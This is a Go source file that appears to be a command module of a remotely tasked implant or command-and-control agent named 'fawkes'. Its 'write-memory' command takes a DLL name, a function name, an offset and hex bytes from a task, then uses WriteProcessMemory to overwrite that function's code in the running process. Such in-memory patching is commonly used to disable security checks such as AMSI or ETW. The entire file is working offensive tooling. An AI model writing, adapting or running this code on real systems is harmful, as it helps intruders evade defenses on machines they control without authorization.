// +build windows

package commands

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"
)

// WriteMemoryCommand implements the write-memory command
type WriteMemoryCommand struct{}

// Name returns the command name
func (c *WriteMemoryCommand) Name() string {
	return "write-memory"
}

// Description returns the command description
func (c *WriteMemoryCommand) Description() string {
	return "Write bytes to a DLL function address"
}

// WriteMemoryArgs represents the arguments for write-memory command
type WriteMemoryArgs struct {
	DllName      string `json:"dll_name"`
	FunctionName string `json:"function_name"`
	StartIndex   int    `json:"start_index"`
	HexBytes     string `json:"hex_bytes"`
}

// Execute executes the write-memory command
func (c *WriteMemoryCommand) Execute(task structs.Task) structs.CommandResult {
	var args WriteMemoryArgs

	// Parse arguments
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		// Try parsing as space-separated string
		parts := strings.Fields(task.Params)
		if len(parts) != 4 {
			return structs.CommandResult{
				Output:    "Error: Invalid arguments. Usage: write-memory <dll_name> <function_name> <start_index> <hex_bytes>",
				Status:    "error",
				Completed: true,
			}
		}
		args.DllName = parts[0]
		args.FunctionName = parts[1]
		fmt.Sscanf(parts[2], "%d", &args.StartIndex)
		args.HexBytes = parts[3]
	}

	// Convert hex string to bytes
	buffer, err := hex.DecodeString(args.HexBytes)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding hex string: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Load DLL
	dll, err := syscall.LoadDLL(args.DllName)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error loading DLL %s: %v", args.DllName, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer dll.Release()

	// Get function address
	proc, err := dll.FindProc(args.FunctionName)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error finding function %s: %v", args.FunctionName, err),
			Status:    "error",
			Completed: true,
		}
	}

	// Calculate target address
	targetAddress := uintptr(proc.Addr()) + uintptr(args.StartIndex)

	// Write memory
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	writeProcessMemory := kernel32.MustFindProc("WriteProcessMemory")
	
	currentProcess, _ := syscall.GetCurrentProcess()
	var bytesWritten uintptr
	
	ret, _, err := writeProcessMemory.Call(
		uintptr(currentProcess),
		targetAddress,
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(len(buffer)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)

	if ret == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error writing memory: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	output := fmt.Sprintf("Successfully wrote %d bytes to %s!%s+0x%x (0x%x)\n", 
		bytesWritten, args.DllName, args.FunctionName, args.StartIndex, targetAddress)
	output += fmt.Sprintf("Bytes written: %s", strings.ToUpper(args.HexBytes))

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}
